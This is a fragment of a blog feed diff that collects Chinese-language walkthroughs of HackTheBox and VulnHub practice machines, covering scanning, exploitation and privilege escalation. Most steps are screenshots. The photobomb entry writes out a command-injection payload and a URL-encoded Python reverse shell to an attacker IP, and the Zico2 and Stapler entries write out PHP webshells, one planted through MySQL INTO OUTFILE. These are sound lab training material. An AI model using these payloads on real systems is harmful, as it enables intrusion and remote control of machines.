alt="image-20230504104950240"></p><p>这里执行getuid或者sysinfo都提示access denied，直接进程迁移即可：</p><p><img src="/2023/04/27/file-upload/mage-20230504105627463-168316916606720.png" alt="image-20230504105627463"></p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>x86系统，接下来用msf自动查找提权模块：</p><p><img src="/2023/04/27/file-upload/mage-20230504105705635-168316916606721.png" alt="image-20230504105705635"></p><p>选择第一个，exploit，拿到system权限：</p><p><img src="/2023/04/27/file-upload/mage-20230504105745329-168316916606311.png" alt="image-20230504105745329"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>htb</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>walkthrough</tag>
+      
+      <tag>htb</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>htb_knife</title>
+    <link href="/2023/05/03/htb-knife/"/>
+    <url>/2023/05/03/htb-knife/</url>
+    
+    <content type="html"><![CDATA[<h1 id="htb-knife"><a href="#htb-knife" class="headerlink" title="htb_knife"></a>htb_knife</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap扫描：</p><p><img src="/2023/04/27/file-upload/age-20230503211205639.png" alt="image-20230503211205639"></p><p>22，80端口开放，进行扫描结果如上。</p><p>火狐访问：</p><p><img src="/2023/04/27/file-upload/age-20230503211315489.png" alt="image-20230503211315489"></p><p>看起来是个静态页面，尝试目录爆破：</p><p><img src="/2023/04/27/file-upload/age-20230503211338356.png" alt="image-20230503211338356"></p><p>没有可用信息。</p><p>尝试curl</p><p><img src="/2023/04/27/file-upload/age-20230503212322026.png" alt="image-20230503212322026"></p><p>发现php&#x2F;8.1.0-dev，searchsploit搜索：<br><img src="/2023/04/27/file-upload/age-20230503212552202.png" alt="image-20230503212552202"></p><p>直接利用py脚本：</p><p><img src="/2023/04/27/file-upload/age-20230503212837304.png" alt="image-20230503212837304"></p><p>getshell。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>使用上述脚本连接的shell不稳定，直接在ua里弹shell，nc监听：</p><p><img src="/2023/04/27/file-upload/age-20230503212939601.png" alt="image-20230503212939601"></p><p><img src="/2023/04/27/file-upload/age-20230503213001126.png" alt="image-20230503213001126"></p><p>sudo -l：</p><p><img src="/2023/04/27/file-upload/age-20230503213116184.png" alt="image-20230503213116184"></p><p>可以sudo执行knife文件。</p><p>使用file和strings命令查看knife：</p><p><img src="/2023/04/27/file-upload/age-20230503213202030.png" alt="image-20230503213202030"></p><p>大概看出为一个rb的可执行文件。</p><p>&#x2F;usr&#x2F;bin&#x2F;knife -h:</p><p><img src="/2023/04/27/file-upload/age-20230503213358978.png" alt="image-20230503213358978"></p><p>knife exec [script]</p><p>因此写一个rb文件，给bash加suid，再通过&#x2F;bin&#x2F;bash -p提权：</p><p><img src="/2023/04/27/file-upload/age-20230503213445945.png" alt="image-20230503213445945"></p><p>成功拿到root权限。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>htb</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>walkthrough</tag>
+      
+      <tag>htb</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>htb_netmon</title>
+    <link href="/2023/05/03/htb-netmon/"/>
+    <url>/2023/05/03/htb-netmon/</url>
+    
+    <content type="html"><![CDATA[<h1 id="htb-netmon"><a href="#htb-netmon" class="headerlink" title="htb_netmon"></a>htb_netmon</h1><p>首先是nmap扫描：</p><p><code>nmap -p- --min-rate=1000 -T4 10.10.10.152</code></p><p><img src="/2023/04/27/file-upload/mage-20230503200138890.png" alt="image-20230503200138890"></p><p>ftp服务开放，ftp尝试匿名登录：</p><p><img src="/2023/04/27/file-upload/mage-20230503200318244.png" alt="image-20230503200318244"></p><p>在public目录下发现user.txt.</p><p>接下来考虑http服务。</p><p>仔细扫一下80口：</p><p><img src="/2023/04/27/file-upload/mage-20230503200414831.png" alt="image-20230503200414831"></p><p>发现为PRTG 18.1，火狐访问：<br><img src="/2023/04/27/file-upload/mage-20230503200507925.png" alt="image-20230503200507925"></p><p>需要账号密码进行登录，尝试prtg默认密码prtgadmin&#x2F;prtgadmin失败，再次回到ftp寻找：</p><p><img src="/2023/04/27/file-upload/mage-20230503200600225.png" alt="image-20230503200600225"></p><p>最终在&#x2F;users&#x2F;all user&#x2F;paessler&#x2F;prtg network monitor目录下找到配置文件（看wp得知）。</p><p>接下来搜索密码相关字符：</p><p><img src="/2023/04/27/file-upload/mage-20230503200714445.png" alt="image-20230503200714445"></p><p>找到prtgadmin&#x2F;PrTg@dmin2018</p><p>利用这组账号登录，失败，正确密码为PrTg@dmin2019(参考wp得知)。</p><p>searchsploit搜索相关漏洞：</p><p><img src="/2023/04/27/file-upload/mage-20230503200847852.png" alt="image-20230503200847852"></p><p>存在RCE，查看sh文件：</p><p><img src="/2023/04/27/file-upload/mage-20230503200916968.png" alt="image-20230503200916968"></p><p>CVE-2018-9276.</p><p>github下载相关利用poc：</p><p><img src="/2023/04/27/file-upload/mage-20230503200959209.png" alt="image-20230503200959209"></p><p>直接为system权限：</p><p><img src="/2023/04/27/file-upload/mage-20230503201012353.png" alt="image-20230503201012353"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>htb</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>walkthrough</tag>
+      
+      <tag>htb</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>htb_cap</title>
     <link href="/2023/05/02/htb-cap/"/>
     <url>/2023/05/02/htb-cap/</url>
     
     <content type="html"><![CDATA[<h1 id="htb-cap"><a href="#htb-cap" class="headerlink" title="htb_cap"></a>htb_cap</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>端口扫描：</p><p><code>nmap -p- --min-rate=1000 -T4 10.10.10.245</code></p><p><img src="/2023/04/27/file-upload/e-20230502220157451.png" alt="image-20230502220157451"></p><p><code>nmap -sC -sV -A -p 21,22,80 10.10.10.245</code></p><p><img src="/2023/04/27/file-upload/e-20230502221443622.png" alt="image-20230502221443622"></p><p>开放了21，22，80端口，首先尝试从80http服务突破，访问：</p><p><img src="/2023/04/27/file-upload/e-20230502223709813.png" alt="image-20230502223709813"></p><p>点击security snapshots：</p><p><img src="/2023/04/27/file-upload/e-20230502224340252.png" alt="image-20230502224340252"></p><p>发现url变为&#x2F;data&#x2F;1.</p><p>此时将url改为&#x2F;data&#x2F;0,页面改变，出现流量，点击下载，查看下载的pcap：</p><p><img src="/2023/04/27/file-upload/e-20230502224432032.png" alt="image-20230502224432032"></p><p>发现tfp流量，查看内容：</p><p><img src="/2023/04/27/file-upload/e-20230502224603202.png" alt="image-20230502224603202"></p><p>找到ftp账号密码。</p><p>接下来使用ftp登录：</p><p><img src="/2023/04/27/file-upload/e-20230502224824145.png" alt="image-20230502224824145"></p><p>找到user.txt。</p><p>再用这组账号尝试直接登录ssh：</p><p><img src="/2023/04/27/file-upload/e-20230502224913833.png" alt="image-20230502224913833"></p><p>成功，接下来提权到root。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>从本地使用wget下载linpeas到靶机上，加执行权限运行：</p><p><img src="/2023/04/27/file-upload/e-20230502225620044.png" alt="image-20230502225620044"></p><p>这里标注出，python3.8，有cap_setuid权限。</p><p>gtfobins网站搜索：</p><p><img src="/2023/04/27/file-upload/e-20230502225710519.png" alt="image-20230502225710519"></p><p>尝试执行：</p><p><img src="/2023/04/27/file-upload/e-20230502225740390.png" alt="image-20230502225740390"></p><p>成功提权到root权限。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>htb</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>walkthrough</tag>
+      
+      <tag>htb</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>htb_legacy</title>
+    <link href="/2023/05/01/htb-legacy/"/>
+    <url>/2023/05/01/htb-legacy/</url>
+    
+    <content type="html"><![CDATA[<h1 id="htb-legacy"><a href="#htb-legacy" class="headerlink" title="htb_legacy"></a>htb_legacy</h1><p>nmap端口扫描：</p><p><img src="/2023/04/27/file-upload/mage-20230501142850551.png" alt="image-20230501142850551"></p><p>扫服务：</p><p><img src="/2023/04/27/file-upload/mage-20230501142914119.png" alt="image-20230501142914119"></p><p>开放135，139，445端口，考虑ms17010，先用nmap进行漏洞扫描：</p><p><code>nmap -sC -sV -A -p 135,139,445 --script vuln 10.10.10.4</code></p><p><img src="/2023/04/27/file-upload/mage-20230501143008849.png" alt="image-20230501143008849"></p><p>ms08-067 vulnerable。</p><p>msf：</p><p><img src="/2023/04/27/file-upload/mage-20230501143055349.png" alt="image-20230501143055349"></p><p>getshell，system权限。</p>]]></content>
     
     
     <categories>
@@ -220,11 +436,65 @@
   
   
   <entry>
+    <title>htb_jerry</title>
+    <link href="/2023/05/01/htb-jerry/"/>
+    <url>/2023/05/01/htb-jerry/</url>
+    
+    <content type="html"><![CDATA[<h1 id="htb-jerry"><a href="#htb-jerry" class="headerlink" title="htb_jerry"></a>htb_jerry</h1><p>nmap先端口扫描：</p><p><img src="/2023/04/27/file-upload/age-20230501213312119.png" alt="image-20230501213312119"></p><p>8080的http服务，firefox访问看看：</p><p><img src="/2023/04/27/file-upload/age-20230501213335521.png" alt="image-20230501213335521"></p><p>tomcat。使用tomcat字典进行目录爆破，先查找tomcat字典：</p><p><img src="/2023/04/27/file-upload/age-20230501213409061.png" alt="image-20230501213409061"></p><p>爆破：</p><p><img src="/2023/04/27/file-upload/age-20230501213425390.png" alt="image-20230501213425390"></p><p>访问之后，发现只有manager可利用，为登录页面：</p><p><img src="/2023/04/27/file-upload/age-20230501213449833.png" alt="image-20230501213449833"></p><p>tomcat&#x2F;tomcat登录失败。此时点击cancel：</p><p><img src="/2023/04/27/file-upload/age-20230501213512808.png" alt="image-20230501213512808"></p><p>返回401页面，并包含了tomcat&#x2F;s3cret的一组账号密码：</p><p><img src="/2023/04/27/file-upload/age-20230501213556528.png" alt="image-20230501213556528"></p><p>成功登录。</p><p>接下来就是上传war来getshell：</p><p><img src="/2023/04/27/file-upload/age-20230501214307244.png" alt="image-20230501214307244"></p><p>msfvenom生成war格式的马，上传：</p><p><img src="/2023/04/27/file-upload/age-20230501214326514.png" alt="image-20230501214326514"></p><p>上传成功，msf中开监听，点击&#x2F;shell即可上线：</p><p><img src="/2023/04/27/file-upload/age-20230501214524229.png" alt="image-20230501214524229"></p><p>查看whoami，system权限：</p><p><img src="/2023/04/27/file-upload/age-20230501214538005.png" alt="image-20230501214538005"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>htb</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>walkthrough</tag>
+      
+      <tag>htb</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>htb_blue</title>
     <link href="/2023/05/01/htb-blue/"/>
     <url>/2023/05/01/htb-blue/</url>
     
     <content type="html"><![CDATA[<h1 id="htb-blue"><a href="#htb-blue" class="headerlink" title="htb_blue"></a>htb_blue</h1><p>nmap端口扫描：</p><p><img src="/2023/04/27/file-upload/ge-20230501102723572.png" alt="image-20230501102723572"></p><p>扫具体服务：</p><p><img src="/2023/04/27/file-upload/ge-20230501102743582.png" alt="image-20230501102743582"></p><p>win7&#x2F;win2008，开放了139，445端口，ms17-010：</p><p><img src="/2023/04/27/file-upload/ge-20230501102958871.png" alt="image-20230501102958871"></p><p>getshell，system权限。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>htb</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>walkthrough</tag>
+      
+      <tag>htb</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>htb_photobomb</title>
+    <link href="/2023/04/28/htb-photobomb/"/>
+    <url>/2023/04/28/htb-photobomb/</url>
+    
+    <content type="html"><![CDATA[<h1 id="htb-photobomb"><a href="#htb-photobomb" class="headerlink" title="htb_photobomb"></a>htb_photobomb</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先使用nmap简单扫一下端口：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125553727.png" alt="image-20230428125553727"></p><p>加上参数扫服务：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125623120.png" alt="image-20230428125623120"></p><p>火狐访问http服务，dns解析出错：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125831914.png" alt="image-20230428125831914"></p><p>域名加到hosts文件：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125940041.png" alt="image-20230428125940041"></p><p>成功：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125955771.png" alt="image-20230428125955771"></p><p>to get started, please click here,点击超链：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130205321.png" alt="image-20230428130205321"></p><p>弹出一个登录框，无法抓取流量，应该是前端校验。</p><p>尝试目录爆破：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130417051.png" alt="image-20230428130417051"></p><p>也没有可利用内容。</p><p>查看源代码：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130456002.png" alt="image-20230428130456002"></p><p>出现可疑js文件，photobomb.js:</p><p><img src="/2023/04/27/file-upload/b/image-20230428130526194.png" alt="image-20230428130526194"></p><p><code>http://pH0t0:b0Mb!@photobomb.htb/printer</code>尝试用此处的pH0t0:b0Mb!作为用户密码进行登录：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130702335.png" alt="image-20230428130702335"></p><p>登录成功。</p><p>页面有下载图片功能，用burp查看具体流量：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130947611.png" alt="image-20230428130947611"></p><p>对photo，filetype等参数测试sql漏洞无果，尝试命令拼接rce。</p><p>首先本地开启http-server：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131139256.png" alt="image-20230428131139256"></p><p><img src="/2023/04/27/file-upload/b/image-20230428131041281.png" alt="image-20230428131041281"></p><p>修改photo参数，输入命令<code>;curl 10.10.16.2</code>，使用ctrl+u，对命令进行编码，空格自动替换为+，发送请求后无响应。</p><p>接下来尝试filetype参数：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131530670.png" alt="image-20230428131530670"></p><p>本地成功接受到curl请求，可以判断存在命令注入：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131517217.png" alt="image-20230428131517217"></p><p>接下来直接反弹shell：</p><p><code>;export+RHOST=&quot;10.10.16.2&quot;;export+RPORT=4444;python3+-c+&#39;import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>同样需要ctrl+u编码：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131733399.png" alt="image-20230428131733399"></p><p>成功接收到shell。</p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>在home下发现user.txt：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132024695.png" alt="image-20230428132024695"></p><p>尝试sudo提权：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132100862.png" alt="image-20230428132100862"></p><p>可以用root权限执行&#x2F;opt&#x2F;cleanup.sh，通过crontab也发现该文件：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132201958.png" alt="image-20230428132201958"></p><p>查看cleanup.sh:</p><p><img src="/2023/04/27/file-upload/b/image-20230428132227028.png" alt="image-20230428132227028"></p><p>注意最后一行，用到了find命令，但是没有使用绝对路径，因此通过路径劫持提权，步骤如下：</p><ul><li>新建一个find文件，通过find文件获取root shell</li><li>更改环境变量，使得sudo运行cleanup.sh时首先使用新建的find</li></ul><p>首先新建find文件，内容为”&#x2F;bin&#x2F;bash”:</p><p><img src="/2023/04/27/file-upload/b/image-20230428132623018.png" alt="image-20230428132623018"></p><p>&#x2F;opt目录不可写，因此写到&#x2F;tmp目录下。</p><p>赋予执行权限：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132708609.png" alt="image-20230428132708609"></p><p>接下来更改环境变量，sudo执行：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132751987.png" alt="image-20230428132751987"></p><p>执行后依然是wizard权限，未获得root权限的shell。</p><p>重新执行<code>sudo PATH=/TMP:$PATH /opt/cleanup.sh</code>后，提权成功：</p><p><img src="/2023/04/27/file-upload/b/image-20230428133006076.png" alt="image-20230428133006076"></p><p>因为<strong>使用sudo执行一条命令时，会起一个新的shell，因此需要在sudo命令后更改环境变量！</strong></p>]]></content>
     
     
     <categories>
@@ -264,6 +534,195 @@
     <tags>
       
       <tag>file upload</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>vulnhub_Zico2</title>
+    <link href="/2023/04/26/vulnhub-Zico2/"/>
+    <url>/2023/04/26/vulnhub-Zico2/</url>
+    
+    <content type="html"><![CDATA[<h1 id="vulnhub-Zico2"><a href="#vulnhub-Zico2" class="headerlink" title="vulnhub_Zico2"></a>vulnhub_Zico2</h1><p>arp-scan+masscan扫端口：</p><p><img src="/2023/04/27/file-upload/2/image-20230309085304660.png" alt="image-20230309085304660"></p><p>nmap扫服务：</p><p><img src="/2023/04/27/file-upload/2/image-20230309085425386.png" alt="image-20230309085425386"></p><p>开放了22，80，111，50670等端口。</p><p>尝试ssh弱口令，失败：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091310662.png" alt="image-20230309091310662"></p><p>访问80端口的http服务：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091518406.png" alt="image-20230309091518406"></p><p>点击各类功能点，发现如下页面，page&#x3D;xxx:</p><p><img src="/2023/04/27/file-upload/2/image-20230309091602675.png" alt="image-20230309091602675"></p><p>尝试本地文件包含，存在漏洞：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091624462.png" alt="image-20230309091624462"></p><p>dirsearch爆破后台目录：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091822847.png" alt="image-20230309091822847"></p><p>发现&#x2F;dbadmin，访问路径：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091837154.png" alt="image-20230309091837154"></p><p>发现phpliteadmin，尝试弱口令admin：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095117322.png" alt="image-20230309095117322"></p><p>登录成功：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095224609.png" alt="image-20230309095224609"></p><p>首先想到查询数据，选择csv格式导出：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095355218.png" alt="image-20230309095355218"></p><p>发现root和zico两个用户。</p><p><img src="/2023/04/27/file-upload/2/image-20230309095433457.png" alt="image-20230309095433457"></p><p>md5解密：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095517231.png" alt="image-20230309095517231"></p><p>直接ssh登录root&#x2F;34root34，失败。</p><p>尝试寻找phpliteadmin漏洞，使用searchsploit搜索：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095627928.png" alt="image-20230309095627928"></p><p>存在代码注入漏洞，根据提示，需要新建数据库，新建表，就能执行php代码。</p><p><img src="/2023/04/27/file-upload/2/image-20230309095639243.png" alt="image-20230309095639243"></p><p>创建表，插入一条数据<code>&lt;?php @eval($_POST[cmd]); ?&gt;</code></p><p><img src="/2023/04/27/file-upload/2/image-20230309100008129.png" alt="image-20230309100008129"></p><p>成功写入，再配合前面的本地文件包含，直接getshell，连上蚁剑。</p><p><img src="/2023/04/27/file-upload/2/image-20230309100225528.png" alt="image-20230309100225528"></p><p>在home下，查找zico相关文件，发现wp配置，存在用户名密码。</p><p><img src="/2023/04/27/file-upload/2/image-20230309100615572.png" alt="image-20230309100615572"></p><p>弹shell到kali，生成交互shell，su zico，切换到zico用户：</p><p><img src="/2023/04/27/file-upload/2/image-20230309100803138.png" alt="image-20230309100803138"></p><p>sudo -l，发现tar，zip，直接提权到root。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>vulnhub</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>vulnhub</tag>
+      
+      <tag>walkthrough</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>vulnhub_Stapler</title>
+    <link href="/2023/04/26/vulnhub-Stapler/"/>
+    <url>/2023/04/26/vulnhub-Stapler/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Stapler"><a href="#Stapler" class="headerlink" title="Stapler"></a>Stapler</h1><p>arp-scan发现目标主机：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307232914512.png" alt="image-20230307232914512"></p><p>masscan全端口扫描：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307232942455.png" alt="image-20230307232942455"></p><p>nmap详细扫描：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307233921356.png" alt="image-20230307233921356"></p><p><img src="/2023/04/27/file-upload/ler/image-20230307233945813.png" alt="image-20230307233945813"></p><p>开放了ftp,ssh,mysql,smb,http等服务。</p><p>ftp允许匿名登录：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307234331021.png" alt="image-20230307234331021"></p><p>查看note文件内容:</p><p><img src="/2023/04/27/file-upload/ler/image-20230307234345835.png" alt="image-20230307234345835"></p><p>这里提到一些用户名：Harry,Jojn,Elly.</p><p>ssh连接：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151213643.png" alt="image-20230308151213643"></p><p>新的用户名Barry。</p><p>尝试弱口令失败，暂时跳过。</p><p>enum4linux可以发现一些用户信息：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171948892.png" alt="image-20230308171948892"></p><p>对于smb协议，查看共享文件夹：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171639530.png" alt="image-20230308171639530"></p><p>可以访问kathy和tmp目录，均无有效信息：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171722902.png" alt="image-20230308171722902"></p><p>666端口服务为止，直接nc：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151340275.png" alt="image-20230308151340275"></p><p>可以看到message2.jpg。</p><p>接收文件并保存：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151442195.png" alt="image-20230308151442195"></p><p>发现为zip文件，改名解压：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151514679.png" alt="image-20230308151514679"></p><p>新用户名Scott.</p><p>收集到以上用户名之后尝试进行ssh和ftp服务的爆破。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308160218674.png" alt="image-20230308160218674"></p><p>ssh爆破失败，但是ftp爆破出elly&#x2F;ylle，登录后并无有用信息。</p><p>接下来把重点放在80和12380端口的http服务。</p><p>先看80：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308085447584.png" alt="image-20230308085447584"></p><p><img src="/2023/04/27/file-upload/ler/image-20230308085437715.png" alt="image-20230308085437715"></p><p>这里有两个配置文件，.bashrc和.profile，先下载到本地。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308085713209.png" alt="image-20230308085713209"></p><p>无有用信息。</p><p>接下来尝试访问12380：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308091700598.png" alt="image-20230308091700598"></p><p>无任何有效信息，访问robots.txt等目录，不发生跳转，返回400：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308091802471.png" alt="image-20230308091802471"></p><p>nikto扫描：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308091905800.png" alt="image-20230308091905800"></p><p>这里提到了&#x2F;admin112233,&#x2F;blogblog等目录，但是http访问后依然为400，nikto显示有ssl信息，使用https:</p><p><img src="/2023/04/27/file-upload/ler/image-20230308092714929.png" alt="image-20230308092714929"></p><p>出现不同的页面。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308092737735.png" alt="image-20230308092737735"></p><p>admin112233为xss页面。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308092803364.png" alt="image-20230308092803364"></p><p>blogblog为博客页面。对该目录进行爆破：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308093300771.png" alt="image-20230308093300771"></p><p>明显为wordpress框架。</p><p>上wpscan：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308093434748.png" alt="image-20230308093434748"></p><p>提示SSL peer certificate or SSH remote key was not OK,可能是ssl证书有问题，disable：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308093703854.png" alt="image-20230308093703854"></p><p>问题解决。</p><p>扫一下用户名：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks --enumerate u</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308160754290.png" alt="image-20230308160754290"></p><p>枚举出用户名后，直接大字典爆破密码：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks -eu -P /usr/share/wordlists/rockyou.txt</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308161305127.png" alt="image-20230308161305127"></p><p>用得到的账号登录：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308161505638.png" alt="image-20230308161505638"></p><p>普通用户权限，非管理员，暂时跳过。</p><p>回到wpscan，对wordpress插件进行扫描，尝试利用插件漏洞，默认为被动扫描，要发现全部插件这里使用主动扫描，ap代表all plugins：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks --enumerate ap --plugins-detection aggressive</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308161957394.png" alt="image-20230308161957394"></p><p>扫出了图中部分插件。经过尝试，advanced-video-embed-embed-videos-or-playlists存在漏洞。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162206276.png" alt="image-20230308162206276"></p><p>在EDB中寻找poc，查看python文件：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162257243.png" alt="image-20230308162257243"></p><p>这里修改url为靶机的地址，运行报错：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162346333.png" alt="image-20230308162346333"></p><p>修改poc，导入ssl，并且加上<code>ssl._create_default_https_context = ssl._create_unverified_context</code></p><p>再次运行，无回显。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162534743.png" alt="image-20230308162534743"></p><p>此时查看登录后的主页，发现出现了.jpg：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308163901154.png" alt="image-20230308163901154"></p><p>尝试直接访问poc中的url：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308163949595.png" alt="image-20230308163949595"></p><p>访问提示页面后出现404。</p><p>尝试访问jpeg文件，wordpress中一般存在&#x2F;wp-content&#x2F;uploads文件夹，访问后发现jpeg文件。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308164229282.png" alt="image-20230308164229282"></p><p>直接wget下载文件：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308164423023.png" alt="image-20230308164423023"></p><p>ssl证书有问题，加上参数–no-check-certificate后解决。</p><p>查看文件内容：<br><img src="/2023/04/27/file-upload/ler/image-20230308164459634.png" alt="image-20230308164459634"></p><p>jpeg文件内容为config文件，包含了数据库配置信息。</p><p>直接登录数据库，找到用户表：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308164621458.png" alt="image-20230308164621458"></p><p>注意John用户存在user_url，可能为管理员权限。</p><p>将用户名密码简单处理后如下：<br><img src="/2023/04/27/file-upload/ler/image-20230308164722763.png" alt="image-20230308164722763"></p><p>用john跑密码：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165310180.png" alt="image-20230308165310180"></p><p>用John&#x2F;incorrect登录后台：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165344905.png" alt="image-20230308165344905"></p><p>成功获得管理员权限。</p><p>尝试寻找上传点传马或者改服务端文件，在插件处发现可以上传文件：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165444017.png" alt="image-20230308165444017"></p><p>直接上传，到uploads目录查看，上传成功：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165511905.png" alt="image-20230308165511905"></p><p>这里如果没找到上传点，可以直接用mysql写马：</p><p><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot; into outfile &quot;/var/www/https/blogblog/wp-content/uploads/cmd1.php</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308174104145.png" alt="image-20230308174104145"></p><p><img src="/2023/04/27/file-upload/ler/image-20230308174122155.png" alt="image-20230308174122155"></p><p><img src="/2023/04/27/file-upload/ler/image-20230308174138286.png" alt="image-20230308174138286"></p><p>连蚁剑，注意需要忽略https证书，不然会连接失败：</p><img src="vulnhub-Stapler/image-20230308165627564.png" alt="image-20230308165627564" style="zoom:50%;" /><p>成功连接：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165610387.png" alt="image-20230308165610387"></p><p>弹shell到kali，pty：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170259336.png" alt="image-20230308170259336"></p><p>home目录下存在很多文件夹，内容都为空。</p><p>查看一下history文件，由于存在很多exit命令，使用grep排除：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170545936.png" alt="image-20230308170545936"></p><p>发现peter和JKanode用户的密码。</p><p>JKanode：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170814399.png" alt="image-20230308170814399"></p><p>peter：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170939917.png" alt="image-20230308170939917"></p><p>直接sudo提权，可以执行任意命令，拿到flag。</p><p>同时拿到www低权限之后，可以使用CVE-2021-4034提权，几乎通杀：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171520442.png" alt="image-20230308171520442"></p>]]></content>
+    
+    
